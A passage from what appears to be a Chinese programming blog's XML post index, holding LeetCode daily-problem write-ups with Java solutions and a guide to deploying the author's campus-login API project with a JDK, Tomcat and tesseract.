&#123; if (place(i, j)) &#123; q[i] = j; dfs(i + 1, n); &#125; &#125; &#125; &#125;&#125; 使用集合记录皇后的位置 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class Solution &#123; List&lt;List&lt;String&gt;&gt; ans = new ArrayList&lt;&gt;(); List&lt;int[]&gt; q = new ArrayList&lt;&gt;(); public List&lt;List&lt;String&gt;&gt; solveNQueens(int n) &#123; dfs(0, n); return ans; &#125; private boolean canPlace(int i,int j) &#123; if (q.size() &lt; 1) &#123; return true; &#125; for (int[] x : q) &#123; if (i == x[0]) &#123; return false; &#125; if (j == x[1]) &#123; return false; &#125; if (Math.abs(i - x[0]) == Math.abs(j - x[1])) &#123; return false; &#125; &#125; return true; &#125; private void dfs(int i,int n) &#123; if (i &gt;= n) &#123; List&lt;String&gt; oneAns = new ArrayList&lt;&gt;(); StringBuilder builder = new StringBuilder(); for (int j = 0; j &lt; n; j++) &#123; builder.append('.'); &#125; for (int j = 0; j &lt; n; j++) &#123; builder.setCharAt(q.get(j)[1], 'Q'); oneAns.add(builder.toString()); builder.setCharAt(q.get(j)[1], '.'); &#125; ans.add(oneAns); &#125; else &#123; for (int j = 0; j &lt; n; j++) &#123; if (canPlace(i, j)) &#123; q.add(new int[]&#123;i,j&#125;); dfs(i + 1, n); q.remove(q.size() - 1); &#125; &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/9/2]]></title>
    <url>%2Fposts%2F3714aa8e%2F</url>
    <content type="text"><![CDATA[题目：剑指 Offer 20. 表示数值的字符串难度：中等 请实现一个函数用来判断字符串是否表示数值（包括整数和小数）。例如，字符串”+100”、”5e2”、”-123”、”3.1416”、”-1E-16”、”0123”都表示数值，但”12e”、”1a3.14”、”1.2.3”、”+-5”及”12e+5.4”都不是。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/biao-shi-shu-zhi-de-zi-fu-chuan-lcof著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 无脑正则 解题代码123456789class Solution &#123; public boolean isNumber(String s) &#123; s = s.trim(); if (s.matches("\\d+(\\+|-)\\d+")) &#123; return false; &#125; return s.matches("(\\+|-)?\\.\\d+") || s.matches("(\\+|-)?\\d+(\\.)?\\d*") || s.matches("((\\+|-)?\\.\\d+)(e|E)?(\\+|-)?\\d+") || s.matches("((\\+|-)?\\d+(\\.)?\\d*)(e|E)?(\\+|-)?\\d+"); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/31]]></title>
    <url>%2Fposts%2F284c031e%2F</url>
    <content type="text"><![CDATA[题目：841. 钥匙和房间难度：中等 有 N 个房间，开始时你位于 0 号房间。每个房间有不同的号码：0，1，2，…，N-1，并且房间里可能有一些钥匙能使你进入下一个房间。 在形式上，对于每个房间 i 都有一个钥匙列表 rooms[i]，每个钥匙 rooms[i][j] 由 [0,1，…，N-1] 中的一个整数表示，其中 N = rooms.length。 钥匙 rooms[i][j] = v 可以打开编号为 v 的房间。 最初，除 0 号房间外的其余所有房间都被锁住。 你可以自由地在房间之间来回走动。 如果能进入每个房间返回 true，否则返回 false。 示例 1： 12345678输入: [[1],[2],[3],[]]输出: true解释: 我们从 0 号房间开始，拿到钥匙 1。之后我们去 1 号房间，拿到钥匙 2。然后我们去 2 号房间，拿到钥匙 3。最后我们去了 3 号房间。由于我们能够进入每个房间，我们返回 true。 示例 2： 123输入：[[1,3],[3,0,1],[2],[0]]输出：false解释：我们不能进入 2 号房间。 提示： 1 &lt;= rooms.length &lt;= 1000 0 &lt;= rooms[i].length &lt;= 1000 所有房间中的钥匙数量总计不超过 3000。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/keys-and-rooms著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 好像没什么好说的，直接dfs搜一次就完成了 解题代码123456789101112131415161718192021222324class Solution &#123; public boolean canVisitAllRooms(List&lt;List&lt;Integer&gt;&gt; rooms) &#123; boolean[] vis = new boolean[rooms.size()]; dfs(rooms,0,vis); for (int i = 0;i &lt; vis.length;i++) &#123; if (!vis[i]) &#123; return false; &#125; &#125; return true; &#125; private void dfs(List&lt;List&lt;Integer&gt;&gt; rooms,int c,boolean[] vis) &#123; vis[c] = true; for (int r : rooms.get(c)) &#123; if (!vis[r]) &#123; dfs(rooms,r,vis); &#125; &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/30]]></title>
    <url>%2Fposts%2F5f4b3388%2F</url>
    <content type="text"><![CDATA[题目：557. 反转字符串中的单词 III难度：简单 给定一个字符串，你需要反转字符串中每个单词的字符顺序，同时仍保留空格和单词的初始顺序。 示例： 12输入：&quot;Let&apos;s take LeetCode contest&quot;输出：&quot;s&apos;teL ekat edoCteeL tsetnoc&quot; 提示： 在字符串中，每个单词由单个空格分隔，并且字符串中不会有任何额外的空格。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reverse-words-in-a-string-iii著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按空格拆分后，依次反转即可 解题代码1234567891011121314class Solution &#123; public String reverseWords(String s) &#123; String[] split = s.split(" "); StringBuilder ans = new StringBuilder(); for (int i = 0;i &lt; split.length;i++) &#123; ans.append(new StringBuilder(split[i]).reverse()); if (i != split.length - 1) &#123; ans.append(" "); &#125; &#125; return ans.toString(); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/29]]></title>
    <url>%2Fposts%2F3f8cba6d%2F</url>
    <content type="text"><![CDATA[题目：214. 最短回文串难度：困难 给定一个字符串 s，你可以通过在字符串前面添加字符将其转换为回文串。找到并返回可以用这种方式转换的最短回文串。 示例 1: 12输入: &quot;aacecaaa&quot;输出: &quot;aaacecaaa&quot; 示例 2: 12输入: &quot;abcd&quot;输出: &quot;dcbabcd&quot; 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/shortest-palindrome著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 先逆序，然后依次判断截取前缀和后缀，判断前缀与原串是否构成回文串（技巧：原串与逆序后的后缀相同，则前缀插入到原串前可构成回文串） 解题代码1234567891011121314151617class Solution &#123; public String shortestPalindrome(String s) &#123; // 逆序 String reverse = new StringBuffer(s).reverse().toString(); // 划分前缀 后缀 for(int i = 0;i &lt; reverse.length();i++) &#123; String prefix = reverse.substring(0,i); String sufix = reverse.substring(i); if(s.startsWith(sufix))&#123; return prefix + s; &#125; &#125; return ""; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/28]]></title>
    <url>%2Fposts%2F488b8afb%2F</url>
    <content type="text"><![CDATA[题目：657. 机器人能否返回原点难度：简单 在二维平面上，有一个机器人从原点 (0, 0) 开始。给出它的移动顺序，判断这个机器人在完成移动后是否在 (0, 0) 处结束。 移动顺序由字符串表示。字符 move[i] 表示其第 i 次移动。机器人的有效动作有 R（右），L（左），U（上）和 D（下）。如果机器人在完成所有动作后返回原点，则返回 true。否则，返回 false。 注意：机器人“面朝”的方向无关紧要。 “R” 将始终使机器人向右移动一次，“L” 将始终向左移动等。此外，假设每次移动机器人的移动幅度相同。 示例 1: 123输入: &quot;UD&quot;输出: true解释：机器人向上移动一次，然后向下移动一次。所有动作都具有相同的幅度，因此它最终回到它开始的原点。因此，我们返回 true。 示例 2: 123输入: &quot;LL&quot;输出: false解释：机器人向左移动两次。它最终位于原点的左侧，距原点有两次 “移动” 的距离。我们返回 false，因为它在移动结束时没有返回原点。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/robot-return-to-origin著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接模拟机器人运动的过程，最后判断结果是否还在原点即可 解题代码12345678910111213141516171819202122232425class Solution &#123; public boolean judgeCircle(String moves) &#123; int v = 0; int o = 0; for (int i = 0;i &lt; moves.length();i++) &#123; switch(moves.charAt(i)) &#123; case 'U': o--; break; case 'D': o++; break; case 'L': v--; break; case 'R': v++; break; &#125; &#125; return v == 0 &amp;&amp; o == 0; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/27]]></title>
    <url>%2Fposts%2Fd834976a%2F</url>
    <content type="text"><![CDATA[题目：332. 重新安排行程难度：中等 给定一个机票的字符串二维数组 [from, to]，子数组中的两个成员分别表示飞机出发和降落的机场地点，对该行程进行重新规划排序。所有这些机票都属于一个从 JFK（肯尼迪国际机场）出发的先生，所以该行程必须从 JFK 开始。 说明: 如果存在多种有效的行程，你可以按字符自然排序返回最小的行程组合。例如，行程 [“JFK”, “LGA”] 与 [“JFK”, “LGB”] 相比就更小，排序更靠前 所有的机场都用三个大写字母表示（机场代码）。 假定所有机票至少存在一种合理的行程。 示例 1: 12输入: [[&quot;MUC&quot;, &quot;LHR&quot;], [&quot;JFK&quot;, &quot;MUC&quot;], [&quot;SFO&quot;, &quot;SJC&quot;], [&quot;LHR&quot;, &quot;SFO&quot;]]输出: [&quot;JFK&quot;, &quot;MUC&quot;, &quot;LHR&quot;, &quot;SFO&quot;, &quot;SJC&quot;] 示例 2: 123输入: [[&quot;JFK&quot;,&quot;SFO&quot;],[&quot;JFK&quot;,&quot;ATL&quot;],[&quot;SFO&quot;,&quot;ATL&quot;],[&quot;ATL&quot;,&quot;JFK&quot;],[&quot;ATL&quot;,&quot;SFO&quot;]]输出: [&quot;JFK&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;SFO&quot;]解释: 另一种有效的行程是 [&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;ATL&quot;,&quot;SFO&quot;]。但是它自然排序更大更靠后。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/reconstruct-itinerary著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 题意是按照贪心策略搜索出字典序最小的欧拉路径，构建出图之后，dfs搜索即可 解题代码1234567891011121314151617181920212223242526272829303132333435363738class Solution &#123; public List&lt;String&gt; findItinerary(List&lt;List&lt;String&gt;&gt; tickets) &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); // 保存图信息 Map&lt;String,List&lt;String&gt;&gt; map = new HashMap&lt;&gt;(); // 构建领接表 for (List&lt;String&gt; ticket : tickets) &#123; String from = ticket.get(0); String to = ticket.get(1); if (map.containsKey(from)) &#123; map.get(from).add(to); // 排序保证字典序最小，贪心策略 Collections.sort(map.get(from)); &#125; else &#123; List&lt;String&gt; nbr = new ArrayList&lt;&gt;(); nbr.add(to); map.put(from,nbr); &#125; &#125; // System.out.println(map); // 以JFK为起点开始搜索 dfs(map,"JFK",ans); return ans; &#125; private void dfs(Map&lt;String,List&lt;String&gt;&gt; map,String from,List&lt;String&gt; ans) &#123; List&lt;String&gt; nbr = map.get(from); while (nbr != null &amp;&amp; nbr.size() &gt; 0) &#123; String to = nbr.remove(0); dfs(map, to, ans); &#125; ans.add(0, from); &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>欧拉路径</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/26]]></title>
    <url>%2Fposts%2Faf33a7fc%2F</url>
    <content type="text"><![CDATA[题目：17. 电话号码的字母组合难度：中等 给定一个仅包含数字 2-9 的字符串，返回所有它能表示的字母组合。 给出数字到字母的映射如下（与电话按键相同）。注意 1 不对应任何字母。 示例: 12输入：&quot;23&quot;输出：[&quot;ad&quot;, &quot;ae&quot;, &quot;af&quot;, &quot;bd&quot;, &quot;be&quot;, &quot;bf&quot;, &quot;cd&quot;, &quot;ce&quot;, &quot;cf&quot;]. 说明: 尽管上面的答案是按字典序排列的，但是你可以任意选择答案输出的顺序。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/letter-combinations-of-a-phone-number著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 没什么好说的，经典的回溯问题 解题代码12345678910111213141516171819202122232425262728293031323334353637class Solution &#123; public List&lt;String&gt; letterCombinations(String digits) &#123; List&lt;String&gt; ans = new ArrayList&lt;&gt;(); if (digits == null || digits.length() &lt; 1) &#123; return ans; &#125; Map&lt;Integer,String&gt; map = new HashMap&lt;&gt;(); map.put(2,"abc"); map.put(3,"def"); map.put(4,"ghi"); map.put(5,"jkl"); map.put(6,"mno"); map.put(7,"pqrs"); map.put(8,"tuv"); map.put(9,"wxyz"); dfs(digits,0,new StringBuilder(),map,ans); return ans; &#125; private void dfs(String digits,int c,StringBuilder tmp,Map&lt;Integer,String&gt; map,List&lt;String&gt; ans) &#123; if (c &gt;= digits.length()) &#123; ans.add(tmp.toString()); return; &#125; String s = map.get(digits.charAt(c) - '0'); for (int i = 0;i &lt; s.length();i++) &#123; tmp.append(s.charAt(i)); dfs(digits,c + 1,tmp,map,ans); tmp.deleteCharAt(tmp.length() - 1); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>回溯算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/25]]></title>
    <url>%2Fposts%2F363af646%2F</url>
    <content type="text"><![CDATA[题目：491. 递增子序列难度：中等 给定一个整型数组, 你的任务是找到所有该数组的递增子序列，递增子序列的长度至少是2。 示例: 12输入: [4, 6, 7, 7]输出: [[4, 6], [4, 7], [4, 6, 7], [4, 6, 7, 7], [6, 7], [6, 7, 7], [7,7], [4,7,7]] 说明: 给定数组的长度不会超过15。 数组中的整数范围是 [-100,100]。 给定数组中可能包含重复数字，相等的数字应该被视为递增的一种情况。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/increasing-subsequences著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 此题类似取幂集，区别就是限制了子集的长度和子集必须递增，这两个条件，直接dfs搜索，然后取满足条件的子集即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839class Solution &#123; // set暴力去重 Set&lt;List&lt;Integer&gt;&gt; ans = new HashSet&lt;&gt;(); public List&lt;List&lt;Integer&gt;&gt; findSubsequences(int[] nums) &#123; // 确保搜索到所有的组合位置 for (int i = 0;i &lt; nums.length;i++) &#123; for (int j = i + 1;j &lt; nums.length;j++) &#123; List&lt;Integer&gt; tmp = new ArrayList&lt;&gt;(); tmp.add(nums[i]); dfs(nums,j,tmp); &#125; &#125; return new ArrayList&lt;&gt;(ans); &#125; private void dfs(int[] nums,int c,List&lt;Integer&gt; tmp) &#123; if (c &gt;= nums.length) &#123; return; &#125; // 满足递增序列，加入解集 if (nums[c] &gt;= tmp.get(tmp.size() - 1)) &#123; tmp.add(nums[c]); if (tmp.size() &gt;= 2) &#123; ans.add(new ArrayList&lt;&gt;(tmp)); &#125; dfs(nums,c + 1,tmp); tmp.remove(tmp.size() - 1); &#125; // 避免搜索遗漏 if (nums[c] != tmp.get(tmp.size() - 1)) &#123; dfs(nums,c + 1,tmp); &#125; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/24]]></title>
    <url>%2Fposts%2F413dc6d0%2F</url>
    <content type="text"><![CDATA[题目：459. 重复的子字符串难度：简单 给定一个非空的字符串，判断它是否可以由它的一个子串重复多次构成。给定的字符串只含有小写英文字母，并且长度不超过10000。 示例 1: 12345输入: &quot;abab&quot;输出: True解释: 可由子字符串 &quot;ab&quot; 重复两次构成。 示例 2: 123输入: &quot;aba&quot;输出: False 示例 3: 12345输入: &quot;abcabcabcabc&quot;输出: True解释: 可由子字符串 &quot;abc&quot; 重复四次构成。 (或者子字符串 &quot;abcabc&quot; 重复两次构成。) 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/repeated-substring-pattern著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 直接用正则表达式匹配即可，一行代码解决问题 解题代码12345class Solution &#123; public boolean repeatedSubstringPattern(String s) &#123; return s.matches("(\\w+)\\1+"); &#125;&#125; 附上暴力取子串匹配解法 123456789101112131415161718192021222324252627class Solution &#123; public boolean repeatedSubstringPattern(String s) &#123; if (s == null) &#123; return false; &#125; if (s.length() == 1) &#123; return false; &#125; if (s.split(s.charAt(0) + "").length == 0) &#123; return true; &#125; for (int i = s.length() - 1;i &gt;= 2;i--) &#123; if (s.length() % i == 0) &#123; String temp = s.substring(0,i); String arr[] = s.split(temp); if (arr.length == 0) &#123; return true; &#125; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>字符串</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/23]]></title>
    <url>%2Fposts%2Fdf595373%2F</url>
    <content type="text"><![CDATA[题目：201. 数字范围按位与难度：中等 给定范围 [m, n]，其中 0 &lt;= m &lt;= n &lt;= 2147483647，返回此范围内所有数字的按位与（包含 m, n 两端点）。 示例 1: 12输入: [5,7]输出: 4 示例 2: 12输入: [0,1]输出: 0 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/bitwise-and-of-numbers-range著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 利用&amp;运算的性质，n &amp; (n - 1)消掉二进制中最右边的1，因此只需要倒着&amp;回去，最后剩下的n就是ans（答案） 解题代码12345678910class Solution &#123; public int rangeBitwiseAnd(int m, int n) &#123; while (m &lt; n) &#123; // 消掉二进制中最右边的1 n = n &amp; (n - 1); &#125; return n; &#125;&#125; 暴力，超时 12345678910111213class Solution &#123; public int rangeBitwiseAnd(int m, int n) &#123; if (m == 0) &#123; return 0; &#125; int ans = m; for (int i = m;i &lt;= n;i++) &#123; ans &amp;= i; &#125; return ans; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>位运算</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/22]]></title>
    <url>%2Fposts%2Fa85e63e5%2F</url>
    <content type="text"><![CDATA[题目：679. 24 点游戏难度：困难 你有 4 张写有 1 到 9 数字的牌。你需要判断是否能通过 *，/，+，-，(，) 的运算得到 24。 示例 1: 123输入: [4, 1, 8, 7]输出: True解释: (8-4) * (7-1) = 24 示例 2: 12输入: [1, 2, 1, 2]输出: False 注意: 除法运算符 / 表示实数除法，而不是整数除法。例如 4 / (1 - 2/3) = 12 。 每个运算符对两个数进行运算。特别是我们不能用 - 作为一元运算符。例如，[1, 1, 1, 1] 作为输入时，表达式 -1 - 1 - 1 - 1 是不允许的。 你不能将数字连接在一起。例如，输入为 [1, 2, 1, 2] 时，不能写成 12 + 12 。 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/24-game著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 一共四张牌，每次选两张，进行四则运算后与剩余的排合并，然后进行下一次搜索，重复这个过程，直到只剩一张牌，此时判断剩下的排面值是否得到了 target：24 即可 解题代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384class Solution &#123; // 目标 int target = 24; // 误差 double limit = 1e-6; public boolean judgePoint24(int[] nums) &#123; List&lt;Double&gt; list = new ArrayList&lt;&gt;(); for (int i : nums) &#123; list.add((double) (i)); &#125; return dfs(list); &#125; private boolean dfs(List&lt;Double&gt; list) &#123; if (list.size() == 0) &#123; return false; &#125; if (list.size() == 1) &#123; return Math.abs(list.get(0) - target) &lt; limit; &#125; // 四选二 for (int i = 0;i &lt; list.size();i++) &#123; for (int j = i + 1;j &lt; list.size();j++) &#123; double a = list.get(i); double b = list.get(j); // 保存没考虑的元素 List&lt;Double&gt; rest = new ArrayList&lt;&gt;(); for (int k = 0;k &lt; list.size();k++) &#123; if (k != i &amp;&amp; k != j) &#123; rest.add(list.get(k)); &#125; &#125; // 考虑a、b进行四则运算之后的情况，进行下一次搜索，共有六种，a+b，a-b，b-a，a*b，a/b，b/a for (int k = 0;k &lt; 6;k++) &#123; switch(k) &#123; case 0: rest.add(a+b); break; case 1: rest.add(a - b); break; case 2: rest.add(b - a); break; case 3: rest.add(a * b); break; case 4: double c = a / b; if (c &gt; limit) &#123; rest.add(c); &#125; break; case 5: double d = b / a; if (d &gt; limit) &#123; rest.add(d); &#125; break; &#125; // 继续搜索 if (dfs(rest)) &#123; return true; &#125; if (rest.size() &gt; 0) &#123; // 回溯 rest.remove(rest.size() - 1); &#125; &#125; &#125; &#125; return false; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始 部署 wisedu-unified-login-api]]></title>
    <url>%2Fposts%2F6c809f81%2F</url>
    <content type="text"><![CDATA[前言 前段时间写了模拟登陆金智教务统一登陆系统的API项目，GitHub传送门，初始想法是爬金智教务系统，比如获取成绩单等信息，后几经更新，做成了可以完成金智统一认证系统的api，功能更为强大，支持几乎所有接入金智的教务系统，这篇文章就针对目前常见的几种服务器操作系统（windows server、ubantu、centos7），来教大家部署api 申明 在教程开始之前，有必要做个申明，如果你不愿意遵守这个申明，ok，请你离开 不允许使用此项目提供付费的代挂服务，或者任意的收费行为，自愿捐赠除外 请尽量让使用者去GitHub给我点个star，以示对原作者的尊重 教程开始windows server准备 需要以下环境，某盘链接：https://pan.baidu.com/s/1aCfxoIfFc89epLEWzvP7Ug提取码：rodq jdk 1.8 tessdata tomcat 9.0.37 操作步骤 安装jdk，并配置环境变量 1.1 安装没什么好说的，全部默认下一步即可 1.2 配置环境变量，参考环境变量_windows 1.3 验证，打开cmd，输入java -version 配置TESSDATA_PREFIX环境变量，指向tessdata文件夹 部署 3.1 如果你用jar包，那你打开cmd，执行命令java -jar wisedu-unified-login-api-v1.0.jar &amp;，然后就到第4步测试 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐C:\Users\Public 然后将war包，放入tomcat/webapps目录下，进入tomcat/bin目录下，双击startup.bat 测试，打开浏览器，访问http://localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html enjoy it!!! ubantu 安装open-jdk-8，命令sudo apt install openjdk-8-jdk 安装tesseract-ocr，参考ubantu配置安装tesseract-ocr 部署 3.1 如果你用jar包，直接执行命令java -jar wisedu-unified-login-api-v1.0.jar &amp;，然后就到第4步测试 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐~/ 然后将war包，放入tomcat/webapps目录下，进入tomcat/bin目录下，执行./startup.sh，如果提示没有执行权限，请执行sudo chmod 777 *.sh修改权限 测试，命令curl localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html，如果提示未找到curl命令，请执行sudo apt install curl安装 enjoy it!!! centos7 安装open-jdk-8，命令sudo yum install java-1.8.0-openjdk 安装tesseract-ocr，参考ubantu配置安装tesseract-ocr 部署 3.1 如果你用jar包，直接执行命令java -jar wisedu-unified-login-api-v1.0.jar &amp;，然后就到第4步测试 3.2 如果你使用war包，那你需要解压tomcat到一个可操作（有写入和读取权限）的目录，推荐~/ 然后将war包，放入tomcat/webapps目录下，进入tomcat/bin目录下，执行./startup.sh，如果提示没有执行权限，请执行sudo chmod 777 *.sh修改权限 测试，命令curl localhost:8080/wisedu-unified-login-api-v1.0/swagger-ui.html enjoy it!!! 注意：如果要开放外网访问，需要在web控制台配置防火墙开放tcp 8080端口，如果是centos7，还需要操作centos中的防火墙，参考https://jingyan.baidu.com/article/5552ef4796f55e518efbc94f.html]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>部署</tag>
        <tag>java</tag>
        <tag>jar</tag>
        <tag>war</tag>
        <tag>windows server</tag>
        <tag>linux server</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/21]]></title>
    <url>%2Fposts%2F3157325f%2F</url>
    <content type="text"><![CDATA[题目：111. 二叉树的最小深度难度：简单 给定一个二叉树，找出其最小深度。 最小深度是从根节点到最近叶子节点的最短路径上的节点数量。 说明: 叶子节点是指没有子节点的节点。 示例: 1234567给定二叉树 [3,9,20,null,null,15,7], 3 / \ 9 20 / \ 15 7 返回它的最小深度 2. 来源：力扣（LeetCode）链接：https://leetcode-cn.com/problems/minimum-depth-of-binary-tree著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。 解题思路 按层级遍历二叉树，找到第一个叶子结点，返回访问的节点个数即可 解题代码bfs 123456789101112131415161718192021222324252627282930313233343536373839404142/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int minDepth(TreeNode root) &#123; int ans = 0; Queue&lt;TreeNode&gt; queue = new LinkedList&lt;&gt;(); queue.add(root); while (!queue.isEmpty()) &#123; int size = queue.size(); while (size-- &gt; 0) &#123; TreeNode poll = queue.poll(); if (poll == null) &#123; return ans; &#125; if (poll.left != null) &#123; queue.add(poll.left); &#125; if (poll.right != null) &#123; queue.add(poll.right); &#125; if (poll.left == null &amp;&amp; poll.right == null) &#123; return ans + 1; &#125; &#125; ans++; &#125; return ans; &#125;&#125; dfs 123456789101112131415161718192021222324252627282930313233/** * Definition for a binary tree node. * public class TreeNode &#123; * int val; * TreeNode left; * TreeNode right; * TreeNode(int x) &#123; val = x; &#125; * &#125; */class Solution &#123; public int minDepth(TreeNode root) &#123; if (root == null) &#123; return 0; &#125; if (root.left == null &amp;&amp; root.right == null) &#123; return 1; &#125; if (root.left == null) &#123; return 1 + minDepth(root.right); &#125; if (root.right == null) &#123; return 1 + minDepth(root.left); &#125; int minLeft = minDepth(root.left); int minRight = minDepth(root.right); return Math.min(minLeft,minRight) + 1; &#125;&#125;]]></content>
      <categories>
        <category>数据结构与算法</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>力扣</tag>
        <tag>算法</tag>
        <tag>题解</tag>
        <tag>深度优先搜索</tag>
        <tag>dfs</tag>
        <tag>二叉树</tag>
        <tag>广度优先搜索</tag>
        <tag>bfs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[力扣每日一题 2020/8/20]]></title>
    <url>%2Fposts%2F465002c9%2F</url>
